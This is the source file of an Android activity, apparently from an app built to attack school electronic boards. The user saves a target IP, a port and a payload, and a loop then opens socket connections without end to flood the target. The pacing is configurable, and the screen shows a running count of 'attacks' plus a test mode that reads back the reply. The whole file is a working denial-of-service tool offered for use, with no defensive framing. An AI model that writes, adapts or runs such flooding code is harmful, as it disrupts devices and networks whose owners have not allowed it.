package xzr.fuck_school_electronic_board;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.DialogInterface;
import android.os.Bundle;
import android.text.InputType;
import android.view.LayoutInflater;
import android.view.MenuItem;
import android.view.View;
import android.widget.EditText;
import android.widget.RadioButton;
import android.widget.TextView;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.Socket;

import xzr.fuck_school_electronic_board.utils.SharedPreferenceUtil;

import static xzr.fuck_school_electronic_board.MainActivity.toast;

public class ddosActivity extends Activity {
TextView t;
RadioButton r1;
EditText e1,e2;
    public void save(View v){
        if(r1.isChecked()) {
            SharedPreferenceUtil.se.putInt("times_sleep", Integer.parseInt(e1.getText().toString()));
            SharedPreferenceUtil.se.putInt("every_sleep", Integer.parseInt(e2.getText().toString()));
            SharedPreferenceUtil.se.commit();
        }
        toast("保存成功",this);
    }
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_ddos);
        getActionBar().setDisplayHomeAsUpEnabled(true);
        e1=findViewById(R.id.gge1);
        e2=findViewById(R.id.gge2);
        t=findViewById(R.id.ddoslog);
        r1=findViewById(R.id.r1);
        r1.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                //参数一为多少次延迟一次 参数二为每次延迟的大小
                e1.setText(SharedPreferenceUtil.sh.getInt("times_sleep",0)+"");
                e1.setInputType(InputType.TYPE_CLASS_NUMBER);
                e2.setText(SharedPreferenceUtil.sh.getInt("every_sleep",0)+"");
                e2.setInputType(InputType.TYPE_CLASS_NUMBER);
            }
        });
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        switch (item.getItemId()){
            case android.R.id.home:
                super.onBackPressed();
                break;

        }
        return super.onOptionsItemSelected(item);
    }
    public void ip(View v){
        final View vv= LayoutInflater.from(this).inflate(R.layout.ip_port_editor,null);
        final EditText e=(EditText)vv.findViewById(R.id.ippe);
        e.setText(SharedPreferenceUtil.sh.getString("ip",""));
        new AlertDialog.Builder(this)
                .setTitle("修改目标ip")
                .setPositiveButton("保存", new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialogInterface, int i) {
                        SharedPreferenceUtil.se.putString("ip",e.getText().toString());
                        SharedPreferenceUtil.se.commit();
                    }
                })
                .setNegativeButton("取消",null)
                .setView(vv)
                .create()
                .show();
    }
    public void port(View v){
        final View vv= LayoutInflater.from(this).inflate(R.layout.ip_port_editor,null);
        final EditText e=(EditText)vv.findViewById(R.id.ippe);
        e.setText(SharedPreferenceUtil.sh.getString("port",""));
        e.setInputType(InputType.TYPE_CLASS_NUMBER);
        new AlertDialog.Builder(this)
                .setTitle("修改目标端口")
                .setPositiveButton("保存", new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialogInterface, int i) {
                        SharedPreferenceUtil.se.putString("port",e.getText().toString());
                        SharedPreferenceUtil.se.commit();
                    }
                })
                .setNegativeButton("取消",null)
                .setView(vv)
                .create()
                .show();
    }
    public void xy(View v){
        final View vv= LayoutInflater.from(this).inflate(R.layout.ip_port_editor,null);
        final EditText e=(EditText)vv.findViewById(R.id.ippe);
        e.setText(SharedPreferenceUtil.sh.getString("xy",""));
        new AlertDialog.Builder(this)
                .setTitle("修改协议内容")
                .setPositiveButton("保存", new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialogInterface, int i) {
                        SharedPreferenceUtil.se.putString("xy",e.getText().toString());
                        SharedPreferenceUtil.se.commit();
                    }
                })
                .setNegativeButton("取消",null)
                .setView(vv)
                .create()
                .show();
    }
    public class ddos implements Runnable{
        String ip;
        int port;
        String xy;
        boolean test;
        public ddos(String ip,int port,String xy,boolean test){
            this.ip=ip;
            this.port=port;
            this.xy=xy;
            this.test=test;
        }
        public void run(){
            try{
                Socket s=new Socket(ip,port);
                OutputStreamWriter o=new OutputStreamWriter(s.getOutputStream());
                BufferedReader b=new BufferedReader(new InputStreamReader(s.getInputStream()));
                o.write(xy+"\n");
                o.write("\r\n");
                o.flush();
                if(test){
                    while (true){
                        String ss=b.readLine();


                        if(ss==null){
                            new Thread(this).destroy();
                        }
                        appendLine(ss);
                    }
                }
                else{
                    new Thread(this).destroy();
                }
            }
            catch (Exception e){

            }
        }
    }
    void appendLine(final String s){
        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                t.setText(t.getText()+s+"\n");
            }
        });
    }
    public void test(View v){

        new Thread(new ddos(SharedPreferenceUtil.sh.getString("ip",""),Integer.parseInt(SharedPreferenceUtil.sh.getString("port","0")),SharedPreferenceUtil.sh.getString("xy",""),true)).start();
         }
    public void gg(View v){
        gg=true;
        int ts= SharedPreferenceUtil.sh.getInt("times_sleep",0);
        int et=SharedPreferenceUtil.sh.getInt("every_sleep",0);
        new gg(ts,et).start();
    }
    class gg extends Thread{
        int ts;
        int et;
        public gg(int times_sleep,int every_time){
            if(times_sleep==0) {
                ts=-1;
            }
            else {
                this.ts = times_sleep;
            }
            this.et=every_time;
        }
        public void run(){
            int i=0;
            int k=0;
            while (gg){
                try {
                    if(k==ts){
                        k=0;
                        Thread.sleep(et);
                    }
                   // Thread.sleep(5);
                    new Thread(new ddos(SharedPreferenceUtil.sh.getString("ip", ""), Integer.parseInt(SharedPreferenceUtil.sh.getString("port", "0")), SharedPreferenceUtil.sh.getString("xy", ""), false)).start();
                    i++;
                    k++;
                    t.setText("进行了"+i+"次攻击");
                }
                catch (Exception e){

                }
            }
        }
    }
    boolean gg=false;
    public void ggt(View v){
        gg=false;
    }
}
